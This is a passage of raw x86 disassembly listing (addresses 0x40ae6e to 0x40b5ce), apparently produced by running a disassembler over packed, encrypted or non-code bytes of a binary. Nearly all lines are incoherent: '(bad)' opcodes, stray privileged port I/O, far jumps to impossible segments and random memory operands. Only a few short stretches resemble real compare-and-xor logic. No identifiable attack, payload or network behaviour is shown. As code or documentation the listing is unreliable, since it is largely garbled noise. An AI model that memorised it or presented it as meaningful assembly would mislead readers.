  40ae6e:	imul   esi,DWORD PTR [esi-0x66b19ed4],0xffffffcc
  40ae75:	loope  0x40ae4d
  40ae77:	ret    0xa5c4
  40ae7a:	add    ah,dh
  40ae7c:	das    
  40ae7d:	add    cl,BYTE PTR [ebp+0x4bcb782d]
  40ae83:	inc    edx
  40ae84:	cmp    bl,BYTE PTR [edi+edi*2-0x10a8a3e2]
  40ae8b:	and    DWORD PTR [esp+edx*8],edx
  40ae8e:	mov    edi,0xf4858672
  40ae93:	loope  0x40ae95
  40ae95:	loope  0x40ae17
  40ae97:	lock xchg ecx,eax
  40ae99:	imul   edi,DWORD PTR [esi],0xffffff9a
  40ae9c:	dec    ecx
  40ae9d:	dec    eax
  40ae9e:	push   ss
  40ae9f:	ret    
  40aea0:	pop    edx
  40aea1:	std    
  40aea2:	xor    al,0x93
  40aea4:	xchg   edi,eax
  40aea5:	fisub  DWORD PTR [ebx+0x31]
  40aea8:	popf   
  40aea9:	mov    al,ds:0x4e1e8290
  40aeae:	(bad)  
  40aeaf:	push   esp
  40aeb0:	js     0x40aec0
  40aeb2:	push   ss
  40aeb3:	dec    esp
  40aeb4:	iret   
  40aeb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aeb6:	sub    DWORD PTR [eax+0x63],eax
  40aeb9:	dec    esi
  40aeba:	and    edi,esi
  40aebc:	ins    BYTE PTR es:[edi],dx
  40aebd:	pop    edx
  40aebe:	dec    edx
  40aebf:	xor    BYTE PTR [ecx],dh
  40aec1:	loope  0x40ae49
  40aec3:	xchg   esi,eax
  40aec4:	inc    DWORD PTR [edx-0x2a]
  40aec7:	not    BYTE PTR [esi+0x6abc175f]
  40aecd:	sub    BYTE PTR [esi-0x5d27168],cl
  40aed3:	mov    ch,cl
  40aed5:	and    eax,0x6f56f1d1
  40aeda:	adc    al,0x84
  40aedc:	shl    DWORD PTR [ebx],cl
  40aede:	leave  
  40aedf:	std    
  40aee0:	clc    
  40aee1:	je     0x40ae98
  40aee3:	ficomp WORD PTR [edx]
  40aee5:	mov    dh,0x84
  40aee7:	pop    esi
  40aee8:	loop   0x40aea9
  40aeea:	call   0x1434:0x6a1a61af
  40aef1:	mov    ebp,0x9e23249b
  40aef6:	sbb    eax,0x58fa975a
  40aefb:	dec    ebx
  40aefc:	stc    
  40aefd:	mov    dl,0x1e
  40aeff:	fdiv   st,st(5)
  40af01:	jg     0x40aef0
  40af03:	and    BYTE PTR [esi],al
  40af05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af06:	lds    esi,FWORD PTR [ebx]
  40af08:	loope  0x40af4c
  40af0a:	(bad)  
  40af0b:	das    
  40af0c:	test   esi,ecx
  40af0e:	retf   
  40af0f:	retf   
  40af10:	aad    0x94
  40af12:	fs sbb al,0x7b
  40af15:	ins    BYTE PTR es:[edi],dx
  40af16:	mov    ds:0x94a41662,al
  40af1b:	div    DWORD PTR [ecx-0x48]
  40af1e:	jnp    0x40aedd
  40af20:	je     0x40af4e
  40af22:	outs   dx,DWORD PTR ds:[esi]
  40af23:	pusha  
  40af24:	adc    dh,bh
  40af26:	test   BYTE PTR [ebx+0x66ee0948],dh
  40af2c:	sbb    cl,bh
  40af2e:	mov    edi,0xfbdad241
  40af33:	or     DWORD PTR [ebp+0x7494476f],esp
  40af39:	push   ss
  40af3a:	sub    al,0x8a
  40af3c:	aad    0x6d
  40af3e:	mov    ds:0x13092477,eax
  40af43:	test   al,0xea
  40af46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af47:	enter  0xda09,0xc
  40af4b:	push   ebp
  40af4c:	(bad)  
  40af4d:	push   cs
  40af4e:	jmp    DWORD PTR [edi+0x5566d55]
  40af54:	lods   eax,DWORD PTR ds:[esi]
  40af55:	inc    edx
  40af56:	jno    0x40af65
  40af58:	adc    al,0x64
  40af5a:	mov    edi,0xabbf06a2
  40af5f:	ds inc ecx
  40af61:	adc    DWORD PTR [ebx+0x3b],ebp
  40af64:	jle    0x40af25
  40af66:	mov    edx,0xe4f3a37e
  40af6b:	xchg   esp,eax
  40af6c:	sbb    DWORD PTR [ebx+edi*4],esp
  40af6f:	mul    ah
  40af71:	add    DWORD PTR [ebp+0x4e134598],ebp
  40af77:	leave  
  40af78:	mov    esp,0x9741d29d
  40af7d:	xchg   esp,eax
  40af7e:	(bad)  
  40af7f:	or     al,0xd7
  40af81:	into   
  40af82:	clc    
  40af83:	call   0x764d:0xe652a1b8
  40af8a:	pop    ebp
  40af8b:	loope  0x40afab
  40af8d:	add    dh,bh
  40af8f:	cli    
  40af90:	cli    
  40af91:	dec    ecx
  40af92:	js     0x40af29
  40af94:	jbe    0x40b004
  40af96:	call   0x666e9d58
  40af9b:	ficom  DWORD PTR [ecx-0x55]
  40af9e:	test   BYTE PTR [esp+ecx*2+0x756c086f],cl
  40afa5:	adc    esp,edi
  40afa7:	neg    edx
  40afa9:	scas   al,BYTE PTR es:[edi]
  40afaa:	pop    esi
  40afab:	repnz outs dx,DWORD PTR ds:[esi]
  40afad:	pop    esi
  40afae:	outs   dx,DWORD PTR ds:[esi]
  40afaf:	cwde   
  40afb0:	ins    DWORD PTR es:[edi],dx
  40afb1:	imul   edx,DWORD PTR [esi],0xa46072b2
  40afb7:	dec    edx
  40afb8:	sbb    eax,0x3da60664
  40afbd:	lock mov cl,0x7c
  40afc0:	adc    eax,0x67bec13b
  40afc5:	aam    0x1d
  40afc7:	sub    BYTE PTR [edx+0x2e],0xd5
  40afcb:	sbb    esp,esp
  40afcd:	out    dx,eax
  40afce:	mov    DWORD PTR [ebp-0xc],ebx
  40afd1:	mov    eax,DWORD PTR [eax]
  40afd3:	mov    cx,WORD PTR [ebp-0x4]
  40afd7:	movzx  ecx,cx
  40afda:	add    ecx,DWORD PTR [eax]
  40afdc:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40afe3:	mov    DWORD PTR [ebp-0x1c],ecx
  40afe6:	jmp    0x40b333
  40afeb:	js     0x40b055
  40afed:	adc    ebp,ebx
  40afef:	jae    0x40b062
  40aff1:	loopne 0x40b05c
  40aff3:	lfs    esi,FWORD PTR [edx]
  40aff6:	or     ch,dl
  40aff8:	xor    al,0xae
  40affa:	loope  0x40b075
  40affc:	call   0x7d6f2e7f
  40b001:	jle    0x40b081
  40b003:	test   al,0x2c
  40b005:	daa    
  40b006:	into   
  40b007:	xchg   ebx,esp
  40b009:	cmp    edi,DWORD PTR [ebx+0x21]
  40b00c:	fstp   QWORD PTR [ebp-0x42868c36]
  40b012:	jle    0x40afde
  40b014:	sbb    DWORD PTR [ecx+0x2edc9915],esp
  40b01a:	(bad)  [esi]
  40b01c:	imul   edx,DWORD PTR [ecx-0x6d],0x9bd78e2b
  40b023:	stos   DWORD PTR es:[edi],eax
  40b024:	adc    dh,BYTE PTR [eax+edx*4-0x5a]
  40b028:	inc    edi
  40b029:	pop    eax
  40b02a:	into   
  40b02b:	and    DWORD PTR [edx],ebp
  40b02d:	jmp    0x2c823d8e
  40b032:	pop    edx
  40b033:	sahf   
  40b034:	shl    BYTE PTR [esi+esi*4-0x63a2d3e7],cl
  40b03b:	das    
  40b03c:	cdq    
  40b03d:	daa    
  40b03e:	rcl    DWORD PTR [ebx+0x10],cl
  40b041:	sub    al,0xf1
  40b043:	pushw  0x6c6f
  40b047:	dec    esi
  40b048:	shr    BYTE PTR [esi+esi*8-0x7355b522],1
  40b04f:	xor    al,BYTE PTR [edi+edx*1-0x7b]
  40b053:	or     al,0x3b
  40b055:	mov    cl,0xf1
  40b057:	inc    eax
  40b058:	adc    eax,0x78d41b23
  40b05d:	jae    0x40afe6
  40b05f:	push   ds
  40b060:	jg     0x40b0c7
  40b062:	push   es
  40b063:	cmp    edx,esi
  40b065:	shr    DWORD PTR [eax+ebp*2-0x68356dbf],1
  40b06c:	mov    al,0xaa
  40b06e:	pop    edx
  40b06f:	pop    ds
  40b070:	xor    ch,BYTE PTR [ecx]
  40b072:	cld    
  40b073:	lock outs dx,DWORD PTR ds:[esi]
  40b075:	loopne 0x40b01f
  40b077:	out    dx,eax
  40b078:	inc    ebx
  40b07a:	add    ah,BYTE PTR [ebp-0x2a]
  40b07d:	(bad)  
  40b07e:	es std 
  40b080:	jecxz  0x40b095
  40b082:	fcomp  st(5)
  40b084:	dec    ebp
  40b085:	out    0x18,eax
  40b087:	fst    DWORD PTR [esi+0x771ee95e]
  40b08d:	jl     0x40b0c7
  40b08f:	jp     0x40b0ff
  40b091:	xchg   DWORD PTR [edx+0x385a2498],esi
  40b097:	pop    ecx
  40b098:	pop    edi
  40b099:	xchg   edi,eax
  40b09a:	cmp    ecx,esp
  40b09c:	push   edx
  40b09d:	test   al,0xa1
  40b09f:	std    
  40b0a0:	sbb    cl,BYTE PTR [edx+esi*8]
  40b0a3:	push   esp
  40b0a4:	nop
  40b0a5:	jle    0x40b0de
  40b0a7:	pop    ebx
  40b0a8:	lahf   
  40b0a9:	cmc    
  40b0aa:	jg     0x40b105
  40b0ac:	pushf  
  40b0ad:	loopne 0x40b0d9
  40b0af:	mov    ds:0xadf360c8,eax
  40b0b4:	clc    
  40b0b5:	scas   eax,DWORD PTR es:[edi]
  40b0b6:	xor    bh,ah
  40b0b8:	inc    eax
  40b0b9:	je     0x40b067
  40b0bb:	lods   al,BYTE PTR ds:[esi]
  40b0bc:	mov    edx,0xd76db286
  40b0c1:	(bad)  [eax]
  40b0c3:	and    ebx,DWORD PTR [edx-0x79711457]
  40b0c9:	push   0xffffffe6
  40b0cb:	pop    edx
  40b0cc:	das    
  40b0cd:	mov    ds:0x42cfffc7,al
  40b0d2:	pop    edi
  40b0d3:	and    ah,BYTE PTR [edx+0x7e]
  40b0d6:	test   BYTE PTR [edx-0x46],dl
  40b0d9:	mov    dh,0x8a
  40b0db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b0dc:	test   al,0x60
  40b0de:	lods   al,BYTE PTR ds:[esi]
  40b0e0:	xchg   ebx,eax
  40b0e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0e2:	inc    DWORD PTR ds:0x32fab2aa
  40b0e8:	xchg   esi,eax
  40b0e9:	jg     0x40b082
  40b0eb:	cld    
  40b0ec:	scas   al,BYTE PTR es:[edi]
  40b0ed:	repz cld 
  40b0ef:	aad    0xe0
  40b0f1:	mov    ds:0x1e97aac0,al
  40b0f6:	jmp    0x59be:0x6ce8fd08
  40b0fd:	and    DWORD PTR [edi+0x1613c500],ebx
  40b103:	xchg   esi,eax
  40b104:	adc    bh,dh
  40b106:	loope  0x40b096
  40b108:	mov    dl,0x1e
  40b10a:	mov    al,ds:0x64f8e7e8
  40b10f:	dec    edi
  40b110:	pop    eax
  40b111:	adc    al,0x5f
  40b113:	pop    ds
  40b114:	sbb    DWORD PTR [eax-0x64],ebp
  40b117:	popf   
  40b118:	std    
  40b119:	xchg   edi,eax
  40b11a:	shl    DWORD PTR [eax-0x4e124e0e],0x5e
  40b121:	cs aad 0xb3
  40b124:	add    al,0xf8
  40b126:	imul   esi,DWORD PTR [edi+0x2f822d4b],0xffffffc1
  40b12d:	pushf  
  40b12e:	inc    edi
  40b12f:	adc    BYTE PTR [esp+ebx*1],bh
  40b132:	push   eax
  40b133:	mov    dl,BYTE PTR [edx+0x41c7d5de]
  40b139:	cmp    ebp,ecx
  40b13b:	call   0x668f90c3
  40b140:	shr    BYTE PTR [edx],1
  40b142:	out    0x1d,al
  40b144:	mov    bl,0xf8
  40b146:	(bad)  
  40b147:	fmul   DWORD PTR [ebx+0x314b09fe]
  40b14d:	sbb    bh,BYTE PTR [ebx]
  40b14f:	adc    DWORD PTR ds:0x9d7bee2f,ecx
  40b155:	scas   al,BYTE PTR es:[edi]
  40b156:	sahf   
  40b157:	dec    eax
  40b158:	rep outs dx,BYTE PTR ds:[esi]
  40b15a:	outs   dx,BYTE PTR ds:[esi]
  40b15b:	dec    eax
  40b15c:	idiv   BYTE PTR [ebx+0x12]
  40b15f:	inc    edx
  40b160:	mov    edx,edi
  40b162:	sub    DWORD PTR gs:[eax],esi
  40b165:	dec    ecx
  40b166:	mov    cl,0x22
  40b168:	je     0x40b114
  40b16a:	mov    cl,0x1d
  40b16c:	adc    BYTE PTR [eax-0x5bf1ad9d],0xdf
  40b173:	cmp    eax,0xc1e1ca38
  40b178:	test   BYTE PTR [edx+0x6d],0x5b
  40b17c:	sbb    al,0xb6
  40b17e:	ficomp DWORD PTR [edi]
  40b180:	mov    cl,0x20
  40b182:	xchg   esp,eax
  40b183:	icebp  
  40b184:	pusha  
  40b185:	loop   0x40b184
  40b187:	mov    esp,0x376ae11
  40b18c:	in     al,dx
  40b18d:	cmp    DWORD PTR [eax-0x220e9347],0xffffffec
  40b194:	rol    DWORD PTR [ecx],1
  40b196:	xchg   BYTE PTR [ebp-0x22],ah
  40b199:	mov    WORD PTR [edi+0x3cfb066f],gs
  40b19f:	add    edi,DWORD PTR [edi]
  40b1a1:	imul   esi,esi,0x5d1a40dd
  40b1a7:	test   al,0x47
  40b1a9:	and    edi,eax
  40b1ab:	popa   
  40b1ac:	fcos   
  40b1ae:	push   ebp
  40b1af:	nop
  40b1b0:	outs   dx,DWORD PTR ds:[esi]
  40b1b1:	and    bl,BYTE PTR ds:0x734cafb1
  40b1b7:	mov    edi,0x30bc0a52
  40b1bc:	fs (bad) 
  40b1be:	scas   eax,DWORD PTR es:[edi]
  40b1bf:	lds    esp,FWORD PTR [edx+0x265dc2]
  40b1c5:	xor    ecx,esp
  40b1c7:	inc    edi
  40b1c8:	outs   dx,BYTE PTR ds:[esi]
  40b1c9:	imul   edi,DWORD PTR [esi-0x866f65f],0x5e
  40b1d0:	mov    ah,0xef
  40b1d2:	inc    esi
  40b1d3:	and    eax,0xda85cecb
  40b1d8:	fsubr  DWORD PTR [ebx+ecx*1+0x7c35efe3]
  40b1df:	xor    al,0x2f
  40b1e1:	neg    BYTE PTR [eax+0x5e]
  40b1e4:	mov    eax,0xc587b37a
  40b1e9:	cld    
  40b1ea:	test   DWORD PTR [edx-0x26795382],esi
  40b1f0:	sbb    al,0x18
  40b1f2:	mov    esp,0x57dbbc01
  40b1f7:	aaa    
  40b1f8:	int    0xb5
  40b1fa:	shr    BYTE PTR ds:0x392043fe,0xe1
  40b201:	scas   eax,DWORD PTR es:[edi]
  40b202:	out    0xa1,al
  40b204:	pop    esi
  40b205:	sbb    BYTE PTR ds:0xed1fa712,0x5d
  40b20c:	je     0x40b27f
  40b20e:	xchg   ecx,eax
  40b20f:	repz and eax,0xbc9db1c3
  40b215:	shl    DWORD PTR [ecx-0x12026dbc],0xef
  40b21c:	dec    ebx
  40b21d:	jo     0x40b21e
  40b21f:	out    0x7c,al
  40b221:	push   ebp
  40b222:	sbb    bl,dl
  40b224:	inc    ebx
  40b225:	mov    bh,0x24
  40b227:	(bad)  
  40b228:	pusha  
  40b229:	and    eax,0xaafbd2a6
  40b22e:	jmp    0xad56:0xee8c6bc1
  40b235:	mov    dl,BYTE PTR gs:[edi-0x70169570]
  40b23c:	repz ss in al,0xad
  40b240:	xchg   BYTE PTR [ebp+0xd],dl
  40b243:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b244:	pop    ds
  40b245:	lds    esi,FWORD PTR [eax]
  40b247:	push   DWORD PTR [ebx+ecx*4]
  40b24a:	cmp    DWORD PTR [ebx+0x62],0x3a
  40b24e:	cmp    al,0x5f
  40b250:	cmp    esi,DWORD PTR [eax]
  40b252:	pop    esp
  40b253:	loope  0x40b218
  40b255:	pop    eax
  40b256:	sbb    eax,0x304518fc
  40b25b:	iret   
  40b25c:	dec    esi
  40b25d:	(bad)  
  40b25f:	mov    ch,0xbd
  40b261:	mov    ah,0xe5
  40b263:	outs   dx,BYTE PTR ds:[esi]
  40b264:	mov    bh,0xd7
  40b266:	mov    ebp,0x44984a19
  40b26b:	bound  eax,QWORD PTR [ecx]
  40b26d:	fnstcw WORD PTR [ebp-0x3a]
  40b270:	(bad)  
  40b271:	das    
  40b272:	xsaves [ebx]
  40b275:	adc    ch,bh
  40b277:	mov    edi,DWORD PTR [ebx-0x10]
  40b27a:	(bad)  [ebx]
  40b27c:	repnz out dx,eax
  40b27e:	sub    esi,DWORD PTR [eax+0x452fca4c]
  40b284:	shl    DWORD PTR [edi+0x6f0c760a],0x3d
  40b28b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b28c:	ror    BYTE PTR [ecx],cl
  40b28e:	mov    ?,WORD PTR [edx+0x4a]
  40b291:	push   edi
  40b292:	mov    al,ds:0xf46a4de9
  40b297:	mov    ecx,0xef5c9013
  40b29c:	pop    ecx
  40b29d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b29e:	js     0x40b2ac
  40b2a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b2a1:	inc    ebx
  40b2a2:	fwait
  40b2a3:	cmp    al,0xc5
  40b2a5:	jmp    0x4ef7f103
  40b2aa:	iret   
  40b2ab:	xor    eax,0x1b4f647d
  40b2b0:	cmp    eax,edx
  40b2b2:	pop    ds
  40b2b3:	sbb    DWORD PTR cs:[esi],edi
  40b2b6:	adc    DWORD PTR [ebx],ebp
  40b2b8:	sbb    BYTE PTR ss:[eax-0xa],ah
  40b2bc:	imul   edi,DWORD PTR [esp+ecx*2-0x54],0xd5dd18e4
  40b2c4:	mov    edi,DWORD PTR [ebx+0x68]
  40b2c7:	(bad)  
  40b2c8:	imul   si,WORD PTR [ebx],0xfff0
  40b2cc:	mov    edi,0xb7af4ae9
  40b2d1:	xchg   edi,eax
  40b2d2:	sbb    bl,bh
  40b2d4:	pop    ecx
  40b2d5:	push   ss
  40b2d6:	not    BYTE PTR [ecx+0x52cf8254]
  40b2dc:	cmp    ch,0xed
  40b2df:	adc    edi,DWORD PTR [edi]
  40b2e1:	xor    eax,0xa84fd92a
  40b2e6:	neg    dl
  40b2e8:	or     eax,0x1f11b38
  40b2ed:	mov    eax,0xeeeafb7c
  40b2f2:	mov    ebp,0xef363914
  40b2f7:	push   ebx
  40b2f8:	dec    ecx
  40b2f9:	add    edi,0xd0c83a8d
  40b2ff:	adc    BYTE PTR [edi-0x58b2c1bc],0x9e
  40b306:	out    0x4a,eax
  40b308:	sti    
  40b309:	dec    edi
  40b30a:	test   ah,dl
  40b30c:	(bad)  
  40b30d:	push   ds
  40b30e:	stc    
  40b30f:	pop    esi
  40b310:	shl    DWORD PTR [ecx+0x4897ee8a],cl
  40b316:	inc    esi
  40b317:	adc    BYTE PTR [edi+ebp*8+0x23943144],cl
  40b31e:	ret    0x1bb6
  40b321:	mov    dh,0x97
  40b323:	inc    edi
  40b324:	imul   eax,DWORD PTR [si-0x5f],0x35122fdb
  40b32c:	jge    0x40b31e
  40b32e:	lea    esp,[ebp+0x0]
  40b331:	xchg   ebp,eax
  40b332:	xchg   BYTE PTR [ebx+0x4d8b0845],cl
  40b338:	clc    
  40b339:	xor    eax,esi
  40b33b:	add    eax,edi
  40b33d:	cmp    DWORD PTR [ecx],eax
  40b33f:	jne    0x40c44a
  40b345:	mov    eax,DWORD PTR [ebp+0x8]
  40b348:	mov    ecx,DWORD PTR [ebp-0x1c]
  40b34b:	xor    eax,esi
  40b34d:	add    eax,edi
  40b34f:	cmp    DWORD PTR [ecx],eax
  40b351:	jne    0x40b6c1
  40b357:	mov    eax,DWORD PTR [ebp+0x8]
  40b35a:	mov    ecx,DWORD PTR [ebp-0x10]
  40b35d:	xor    eax,esi
  40b35f:	add    eax,edi
  40b361:	mov    DWORD PTR [ecx],eax
  40b363:	jmp    0x40b6b0
  40b368:	cmp    eax,0xe9fdcd2a
  40b36d:	pop    ecx
  40b36e:	dec    ebp
  40b36f:	push   0x46
  40b371:	aam    0xcc
  40b373:	int3   
  40b374:	aam    0x5a
  40b376:	pop    es
  40b377:	int3   
  40b378:	sub    edi,esi
  40b37a:	jle    0x40b3fa
  40b37c:	cs jge 0x40b3fd
  40b37f:	jle    0x40b321
  40b381:	push   0xbd00b56e
  40b386:	mov    edi,0x8910c075
  40b38b:	popa   
  40b38c:	outs   dx,BYTE PTR ds:[esi]
  40b38d:	sub    al,bl
  40b38f:	xlat   BYTE PTR ds:[ebx]
  40b390:	imul   DWORD PTR [eax+0x47]
  40b393:	mov    eax,ds:0x9e4d5c87
  40b398:	sbb    BYTE PTR [eax+edi*4],al
  40b39b:	test   eax,0x70dd17ca
  40b3a0:	call   DWORD PTR [edi+0xeae4a90]
  40b3a6:	div    DWORD PTR [eiz*8-0x782e1610]
  40b3ad:	and    ch,BYTE PTR [edx+0x37]
  40b3b0:	mov    eax,0xff93
  40b3b5:	rcl    DWORD PTR [ebp+0x49],cl
  40b3b8:	jmp    0x2f8bda30
  40b3bd:	mov    bh,0x22
  40b3bf:	push   esp
  40b3c0:	mov    esi,0x28c18989
  40b3c5:	pop    ebx
  40b3c6:	and    bl,ch
  40b3c8:	je     0x40b422
  40b3ca:	outs   dx,BYTE PTR ds:[esi]
  40b3cb:	jge    0x40b3f9
  40b3cd:	or     bl,BYTE PTR [esi+edi*2+0x57337096]
  40b3d4:	out    0x6c,al
  40b3d6:	jnp    0x40b439
  40b3d8:	jmp    0x40b3aa
  40b3da:	ret    
  40b3db:	js     0x40b38c
  40b3dd:	vunpcklpd ymm1,ymm5,ymm7
  40b3e1:	xor    BYTE PTR [esi+eax*8],0xb6
  40b3e5:	dec    edx
  40b3e6:	pop    ss
  40b3e7:	sbb    edi,DWORD PTR [edi+esi*8]
  40b3ea:	add    BYTE PTR [ecx],cl
  40b3ec:	into   
  40b3ed:	daa    
  40b3ee:	lahf   
  40b3ef:	leave  
  40b3f0:	lods   al,BYTE PTR ds:[esi]
  40b3f1:	jbe    0x40b3ef
  40b3f3:	out    dx,al
  40b3f4:	add    al,0xfc
  40b3f6:	lods   eax,DWORD PTR ds:[esi]
  40b3f7:	pop    es
  40b3f8:	jg     0x40b3e3
  40b3fa:	ret    0x194e
  40b3fd:	(bad)  
  40b3fe:	mov    ebp,0xf589f3c1
  40b403:	push   ds
  40b404:	ret    0x9909
  40b407:	aad    0xcf
  40b409:	daa    
  40b40a:	jge    0x40b425
  40b40c:	cld    
  40b40d:	loopne 0x40b390
  40b40f:	mov    dl,0x2f
  40b411:	lods   eax,DWORD PTR ds:[esi]
  40b412:	ret    0x8746
  40b415:	sub    eax,ecx
  40b417:	clc    
  40b418:	push   esi
  40b419:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b41a:	lods   eax,DWORD PTR ds:[esi]
  40b41b:	inc    edi
  40b41c:	dec    esp
  40b41d:	xor    eax,0xc071648f
  40b422:	pop    esi
  40b423:	and    al,0x72
  40b425:	pusha  
  40b426:	pushf  
  40b427:	pop    ss
  40b428:	in     eax,dx
  40b429:	jp     0x40b42a
  40b42b:	sub    eax,0x3eb73bbd
  40b430:	dec    ebx
  40b431:	icebp  
  40b432:	fldenv [edx]
  40b434:	sub    dh,BYTE PTR [esi+0x57]
  40b437:	mov    dh,0xd9
  40b439:	push   edx
  40b43a:	add    BYTE PTR [esi-0xd],ah
  40b43d:	mov    cl,0x4
  40b43f:	out    0xc7,eax
  40b441:	mov    ah,0xe
  40b443:	add    DWORD PTR gs:[edx+edi*1+0x7f],ecx
  40b448:	jp     0x40b413
  40b44a:	sbb    DWORD PTR [edx+0x58],edx
  40b44d:	(bad)  
  40b44f:	imul   DWORD PTR ds:0x7cfb2c68
  40b455:	or     eax,0x290edb68
  40b45a:	repz js 0x40b455
  40b45d:	out    dx,eax
  40b45e:	sub    BYTE PTR [ebx+edx*2-0x34],dh
  40b462:	pop    ebx
  40b463:	mov    bl,0x2a
  40b465:	fwait
  40b466:	cmp    esp,ebx
  40b468:	fld    st(4)
  40b46a:	jnp    0x40b47f
  40b46c:	outs   dx,DWORD PTR ds:[esi]
  40b46d:	adc    BYTE PTR [edx+0x6a9167a0],bh
  40b473:	jecxz  0x40b424
  40b475:	sbb    al,0xdf
  40b477:	sahf   
  40b478:	lods   al,BYTE PTR ds:[esi]
  40b479:	xchg   edx,eax
  40b47a:	lds    ebx,FWORD PTR [eax]
  40b47c:	addr16 mov edx,0x54418f07
  40b482:	cs sbb eax,0xc38aceed
  40b488:	adc    BYTE PTR [edx],0x2b
  40b48b:	jno    0x40b46d
  40b48d:	mov    ebx,0x3f60ecc0
  40b492:	js     0x40b450
  40b494:	and    esp,DWORD PTR [eax-0x5e2201d]
  40b49a:	out    dx,al
  40b49b:	out    dx,eax
  40b49c:	pusha  
  40b49d:	mov    BYTE PTR [eax+0x701682e8],0x9e
  40b4a4:	cdq    
  40b4a5:	xor    ch,cl
  40b4a7:	pop    ebp
  40b4a8:	sbb    eax,0x4396e2c8
  40b4ad:	cmp    edi,edx
  40b4af:	jp     0x40b464
  40b4b1:	sti    
  40b4b2:	test   eax,0x40e66fc9
  40b4b7:	(bad)
  40b4ba:	xor    edi,DWORD PTR [ecx-0x1fc00170]
  40b4c0:	shr    bh,cl
  40b4c2:	mov    edx,0xf4c079ed
  40b4c7:	xor    DWORD PTR [ebp-0x35],ecx
  40b4ca:	(bad)  
  40b4cb:	lods   eax,DWORD PTR ds:[esi]
  40b4cc:	hlt    
  40b4cd:	scas   eax,DWORD PTR es:[edi]
  40b4ce:	icebp  
  40b4cf:	test   dl,ch
  40b4d1:	lahf   
  40b4d2:	pop    edi
  40b4d3:	ss in  al,0xdd
  40b4d6:	mov    al,0x4b
  40b4d8:	pop    ss
  40b4d9:	and    BYTE PTR [eax],0x6e
  40b4dc:	outs   dx,BYTE PTR ds:[esi]
  40b4dd:	lds    esp,FWORD PTR [edi+0x44]
  40b4e0:	into   
  40b4e1:	cmp    DWORD PTR [esi-0xf],ebx
  40b4e4:	stc    
  40b4e5:	sbb    ebp,DWORD PTR [ebx-0x69]
  40b4e8:	scas   al,BYTE PTR es:[edi]
  40b4e9:	aam    0x60
  40b4eb:	pop    edx
  40b4ec:	mov    dl,0x5b
  40b4ee:	jo     0x40b4e9
  40b4f0:	outs   dx,DWORD PTR ds:[esi]
  40b4f1:	pop    ebp
  40b4f2:	in     eax,0x85
  40b4f4:	pop    edx
  40b4f5:	mov    ds:0x321dd1fd,eax
  40b4fa:	xchg   esp,eax
  40b4fb:	aas    
  40b4fc:	dec    esp
  40b4fd:	xor    eax,0x6a0809f5
  40b502:	push   0x9c08ac9e
  40b507:	jno    0x40b4cd
  40b509:	aam    0x76
  40b50b:	add    al,0x32
  40b50d:	lock loop 0x40b52a
  40b510:	push   cs
  40b511:	sbb    DWORD PTR [esp+edx*4+0x53],esp
  40b515:	push   0x68
  40b517:	mov    ds:0x2addfe11,al
  40b51c:	adc    dh,ch
  40b51e:	cli    
  40b51f:	dec    ebp
  40b520:	ins    DWORD PTR es:[edi],dx
  40b521:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b522:	sub    bh,BYTE PTR [ecx+0x2f348bbf]
  40b528:	jno    0x40b4fe
  40b52a:	pop    es
  40b52b:	out    dx,al
  40b52c:	test   al,0x51
  40b52e:	rcl    DWORD PTR [edx+0xc770e3d],0x1c
  40b535:	popa   
  40b536:	push   esp
  40b537:	mov    WORD PTR [edi+0x15],ds
  40b53a:	jmp    0x40b4fe
  40b53c:	sbb    eax,0x376a3a71
  40b541:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b542:	sbb    BYTE PTR [ebx],ah
  40b544:	stc    
  40b545:	and    BYTE PTR [ebp+0x58],dl
  40b548:	sbb    DWORD PTR [eax],0x2f
  40b54b:	jne    0x40b55d
  40b54d:	popf   
  40b54e:	retf   0x8b80
  40b551:	lods   al,BYTE PTR ds:[esi]
  40b552:	sub    dh,BYTE PTR [ebx]
  40b554:	loope  0x40b58e
  40b556:	inc    ebx
  40b557:	int3   
  40b558:	and    ch,bh
  40b55a:	mov    cl,0xbf
  40b55c:	aaa    
  40b55d:	mov    ds:0xf07d2046,al
  40b562:	pop    ebx
  40b563:	mov    DWORD PTR [ebx],0x12fad6a7
  40b569:	jbe    0x40b570
  40b56b:	jmp    0x40b598
  40b56d:	in     al,dx
  40b56e:	pop    edi
  40b56f:	stos   BYTE PTR es:[edi],al
  40b570:	fldcw  WORD PTR [edi]
  40b572:	in     al,dx
  40b573:	jbe    0x40b568
  40b575:	mov    esp,0x299f81c3
  40b57a:	mov    ah,0xe2
  40b57c:	pop    ebp
  40b57d:	into   
  40b57e:	mov    esi,0xa2d931ef
  40b583:	in     eax,0x81
  40b585:	adc    ch,dh
  40b587:	sbb    DWORD PTR [edx],0xf7ff09f8
  40b58d:	xchg   esp,eax
  40b58e:	pop    ebp
  40b58f:	ins    DWORD PTR es:[edi],dx
  40b590:	cwde   
  40b591:	pop    edi
  40b592:	pop    eax
  40b593:	push   eax
  40b594:	lods   eax,DWORD PTR ds:[esi]
  40b595:	mov    ebx,0x97b409e9
  40b59a:	retf   0x738e
  40b59d:	hlt    
  40b59e:	bound  edi,QWORD PTR [edx+edi*1+0x25bd7665]
  40b5a5:	pushf  
  40b5a6:	adc    BYTE PTR [eax-0x4a9b5dea],dh
  40b5ac:	loope  0x40b623
  40b5ae:	daa    
  40b5af:	aam    0x7
  40b5b1:	and    DWORD PTR [ecx+0x2c],esi
  40b5b4:	inc    esi
  40b5b5:	ja     0x40b53d
  40b5b7:	idiv   cl
  40b5b9:	(bad)  
  40b5ba:	and    eax,0x100dd18
  40b5bf:	frstor [edx+0x64ee2c1]
  40b5c5:	xchg   edi,eax
  40b5c6:	retf   
  40b5c7:	cmp    al,0x6e
  40b5c9:	fbstp  TBYTE PTR [esi-0x3d]
  40b5cc:	pop    ebp
  40b5cd:	push   cs
  40b5ce:	cmp    edx,eax
